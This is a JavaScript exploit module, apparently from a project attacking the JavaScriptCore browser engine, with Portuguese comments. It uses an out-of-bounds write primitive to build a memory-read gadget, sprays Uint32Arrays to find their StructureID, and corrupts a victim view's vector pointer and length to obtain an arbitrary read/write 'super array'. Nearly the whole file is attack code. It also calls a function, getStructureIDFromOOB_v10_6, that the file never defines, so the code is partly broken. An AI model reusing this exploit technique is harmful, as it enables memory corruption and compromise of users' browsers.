// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.8";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_8";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C; // Onde plantamos o LowDWORD do endereço fonte da cópia
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;   // Onde o "ponteiro fonte mágico" (0xoffset_0x0) aparece
const CORRUPTION_OFFSET_TRIGGER = 0x70;      // Onde escrevemos 0xFFFFFFFF_FFFFFFFF para acionar a "mágica"
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100; // Onde o QWORD lido (JSCell) será copiado

let getter_copy_called_flag_v10_8 = false;

// !!!!! ESTE VALOR PRECISA SER DESCOBERTO E ATUALIZADO !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 36; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA na v10.4)
// Lê 8 bytes de oob_array_buffer_real[dword_source_offset_to_read_from]
// e os copia para oob_array_buffer_real[TARGET_COPY_DEST_OFFSET_IN_OOB]
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_8 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD); // Erro crítico
    }

    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em 0x6C.
    // A "mágica" fará com que a parte ALTA do QWORD em 0x68 (INTERMEDIATE_PTR_OFFSET_0x68)
    // se torne dword_source_offset_to_read_from. É este valor que o getter usará.
    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0x0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_8 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high(); // Este DEVE ser dword_source_offset_to_read_from

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else { // Falha na "mágica"
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(10); // Pausa mínima

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_8) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) && // Erro no getter
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) { // Erro de "mágica"
        return copied_qword.low(); // StructureID + Flags nos 4 bytes baixos do JSCell
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.8)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverAndCorrupt_v10.8`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID, Corrupção Direcionada e Identificação de SuperArray ---`, "test", FNAME_CURRENT_TEST);

    let sprayedVictimViews = []; // Para manter referências JS
    let superArray = null;
    let superArrayIndex = -1;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // --- PASSO 1: Tentar Descobrir EXPECTED_UINT32ARRAY_STRUCTURE_ID ---
        logS3("PASSO 1: Tentando descobrir StructureID de Uint32Array...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY_FOR_SID = 150;
        const U32_SPRAY_LEN_FOR_SID = 12; // Tamanho ligeiramente diferente
        for (let i = 0; i < NUM_U32_SPRAY_FOR_SID; i++) {
            sprayedVictimViews.push(new Uint32Array(U32_SPRAY_LEN_FOR_SID + (i % 3)));
        }
        logS3(`  ${sprayedVictimViews.length} Uint32Arrays pulverizados para descoberta de SID.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        let found_sids_map = {};
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x8000, oob_array_buffer_real.byteLength - 0x20); // Scan até ~16KB
        const SCAN_STEP_SID = 0x08; 
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por SIDs...`, "info", FNAME_CURRENT_TEST);
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF && (sid & 0xFFFF0000) !== 0xCAFE0000) {
                if (typeof known_ab_sid !== 'number' || (sid & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) {
                    found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                }
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 100) === 0) await PAUSE_S3(1);
        }
        
        let most_frequent_sid_val = null; let max_freq = 0;
        Object.keys(found_sids_map).sort((a,b) => found_sids_map[b] - found_sids_map[a]).slice(0,5).forEach(sid_key => {
            const sid_val = parseInt(sid_key);
            logS3(`    - SID Candidato: ${toHex(sid_val)}  Contagem: ${found_sids_map[sid_val]}`, "info", FNAME_CURRENT_TEST);
            if (found_sids_map[sid_val] > max_freq) { max_freq = found_sids_map[sid_val]; most_frequent_sid_val = sid_val; }
        });
        
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY_FOR_SID / 20, 5)) {
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID DESCOBERTO (Provável para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            document.title = `U32 SID=${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum StructureID de Uint32Array proeminente descoberto. Usando placeholder.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`  Usando como EXPECTED_UINT32ARRAY_STRUCTURE_ID: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);
        sprayedVictimViews = []; // Limpa para o próximo spray


        // --- PASSO 2: Encontrar um Uint32Array real, corromper e identificar ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID === PLACEHOLDER_SID_UINT32ARRAY) {
            logS3("PASSO 2 IGNORADO: StructureID do Uint32Array não foi descoberto confiavelmente.", "warn", FNAME_CURRENT_TEST);
        } else {
            logS3(`PASSO 2: Procurando por Uint32Array com SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper...`, "info", FNAME_CURRENT_TEST);
            const NUM_TARGET_SPRAY = 50; // Menos, para facilitar a busca se um for corrompido
            const TARGET_VIEW_ELEMENT_COUNT = 8;
            let victim_candidate_offset = -1;

            // Re-pulverizar, desta vez views sobre o oob_array_buffer_real para que m_vector=0 seja útil
            let data_offset_for_views = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x400;
            for (let i = 0; i < NUM_TARGET_SPRAY; i++) {
                 if (data_offset_for_views + (TARGET_VIEW_ELEMENT_COUNT * 4) > oob_array_buffer_real.byteLength) break;
                 try {
                    let view = new Uint32Array(oob_array_buffer_real, data_offset_for_views, TARGET_VIEW_ELEMENT_COUNT);
                    view[0] = (0xBEEF0000 | i); // Marcador nos dados
                    sprayedVictimViews.push(view); // Guardar as referências JS
                    data_offset_for_views += (TARGET_VIEW_ELEMENT_COUNT * 4) + 0x10; // Espaçar um pouco
                 } catch(e) {break;}
            }
            logS3(`  ${sprayedVictimViews.length} Uint32Array views pulverizadas para corrupção.`, "info", FNAME_CURRENT_TEST);
            await PAUSE_S3(200);

            // Escanear por um deles
            for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
                let sid = await getStructureIDFromOOB_v10_6(offset);
                if (sid === EXPECTED_UINT32ARRAY_STRUCTURE_ID) {
                    victim_candidate_offset = offset;
                    logS3(`  Encontrado Uint32Array com SID ${toHex(sid)} em ${toHex(victim_candidate_offset)}! Este será o alvo.`, "good", FNAME_CURRENT_TEST);
                    break;
                }
            }

            if (victim_candidate_offset !== -1) {
                const mvec_addr = victim_candidate_offset + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
                const mlen_addr = victim_candidate_offset + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

                logS3(`    Corrompendo m_vector=${toHex(0)} e m_length=${toHex(0xFFFFFFFF)} para objeto em ${toHex(victim_candidate_offset)}`, "info", FNAME_CURRENT_TEST);
                oob_write_absolute(mvec_addr, AdvancedInt64.Zero, 8);
                oob_write_absolute(mlen_addr, 0xFFFFFFFF, 4);
                await PAUSE_S3(50); // Pausa para a corrupção assentar

                // Verificar se a corrupção funcionou lendo diretamente da memória
                const corrupted_mvec = await getStructureIDFromOOB_v10_6(mvec_addr - JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET) === null ? null : oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8); // Re-lê o QWORD copiado
                const corrupted_mlen_qword = await getStructureIDFromOOB_v10_6(mlen_addr - JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET) === null ? null : oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
                const corrupted_mlen = corrupted_mlen_qword ? corrupted_mlen_qword.low() : null;

                logS3(`    PÓS-CORRUPÇÃO DIRETA (lido via cópia): m_vector=${corrupted_mvec ? corrupted_mvec.toString(true):"N/A"}, m_length=${toHex(corrupted_mlen)}`, "leak", FNAME_CURRENT_TEST);

                if (corrupted_mvec && corrupted_mvec.isZero() && corrupted_mlen === 0xFFFFFFFF) {
                    logS3("      !!!! SUCESSO NA CORRUPÇÃO DO Uint32Array REAL !!!!", "vuln", FNAME_CURRENT_TEST);
                    document.title = `U32Array @${toHex(victim_candidate_offset)} Corrompido!`;

                    const MARKER_VAL = 0xFEEDFACE;
                    const MARKER_IDX = 1; // (TARGET_VIEW_METADATA_OFFSET_IN_OOB + 0x10) / 4; -> Usar um índice simples no oob_buffer
                    const MARKER_OOB_OFFSET = MARKER_IDX * 4;
                    let orig_val = oob_read_absolute(MARKER_OOB_OFFSET, 4);
                    oob_write_absolute(MARKER_OOB_OFFSET, MARKER_VAL, 4);

                    for (let i = 0; i < sprayedVictimViews.length; i++) {
                        try {
                            if (sprayedVictimViews[i][MARKER_IDX] === MARKER_VAL) {
                                superArray = sprayedVictimViews[i];
                                superArrayIndex = i;
                                logS3(`      !!!!!! SUPER ARRAY (VIEW) ENCONTRADO em sprayedVictimViews[${i}] (marcador inicial: ${toHex(superArray[0])}) !!!!!!`, "vuln", FNAME_CURRENT_TEST);
                                document.title = `SUPER_ARRAY[${i}] ACHADO!`;
                                break;
                            }
                        } catch (e) {}
                    }
                    oob_write_absolute(MARKER_OOB_OFFSET, orig_val, 4); // Restaurar
                } else {
                    logS3("      Falha ao corromper m_vector/m_length do Uint32Array real como esperado.", "error", FNAME_CURRENT_TEST);
                }
            } else {
                logS3("  Não foi possível encontrar um Uint32Array com o SID esperado para corrupção.", "warn", FNAME_CURRENT_TEST);
            }
        }

        if (superArray) {
            logS3(`SUPER ARRAY IDENTIFICADO (índice ${superArrayIndex}). Agora pode ser usado para R/W arbitrário (sobre oob_array_buffer_real).`, "vuln", FNAME_CURRENT_TEST);
            // Exemplo de uso:
            // superArray[ (offset_desejado_no_oob_buffer) / 4 ] = valor;
            // let lido = superArray[ (offset_desejado_no_oob_buffer) / 4 ];
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedVictimViews = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
